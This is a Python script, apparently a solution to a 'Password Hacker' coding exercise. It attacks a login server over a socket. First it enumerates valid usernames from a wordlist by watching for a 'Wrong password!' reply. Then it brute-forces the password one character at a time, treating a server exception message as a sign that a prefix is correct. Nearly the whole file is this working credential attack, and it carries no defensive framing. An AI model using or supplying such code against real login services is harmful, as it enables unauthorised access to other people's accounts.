import socket
import argparse
import itertools
import json
import string

login_data = {
    "login": "",
    "password": ""
}

filename = "C:\\Users\\KoliaS-PC\\PycharmProjects\\Password Hacker\\Password Hacker\\task\hacking\\logins.txt"
logins_list = list(item.replace("\n", "") for item in open(filename))

# filename = "passwords.txt"
# psw_list = list(item.replace("\n", "") for item in open(filename))

psw_list = list(string.ascii_lowercase) + list(string.digits)


# take argums from command line
argums = argparse.ArgumentParser("ip, port")
argums.add_argument("ip_address")
argums.add_argument("port")

str_arg = argums.parse_args()

psw_item = 0


def check_answer(data):
    result = json.loads(data)
    if result['result'] == "Wrong login!":
        # print("Wrong login")
        return 2
    elif result['result'] == "Wrong password!":
        # print("Wrong password")
        return 3
    elif result['result'] == "Exception happened during login":
        # print("Exception happened during login")
        return 99
    elif result['result'] == "Connection success!":
        # print("Connection success!")
        return 1
    return 0

def generate_req(login, password):
    login_data['login'] = login
    login_data['password'] = password
    return json.dumps(login_data)


with socket.socket() as cli_socket:
    cli_socket.connect((str_arg.ip_address, int(str_arg.port)))

    for login in logins_list:

        cli_socket.send("".join(generate_req(login, '')).encode())
        ret_num = check_answer(cli_socket.recv(1024))
        if ret_num == 3 :
            # print(login)
            break


    psw_len = 1
    psw_found = 0
    save_psw =""
    while psw_found == 0:
            for first in itertools.product(psw_list, repeat=1):
                if psw_found == 1: break
                for gen_psw in list(map(lambda x: ''.join(x), itertools.product(
                        *([letter.lower(), letter.upper()] if letter.isalpha() else [letter] for letter in first)))):

                    gen_psw_send = save_psw + gen_psw

                    cli_socket.send("".join(generate_req(login, gen_psw_send)).encode())
                    ret_num = check_answer(cli_socket.recv(1024))

                    if ret_num == 99:
                        save_psw = gen_psw_send
                    elif ret_num == 1:
                        psw_found = 1
                        print(generate_req(login, gen_psw_send))
                        break
            psw_len += 1

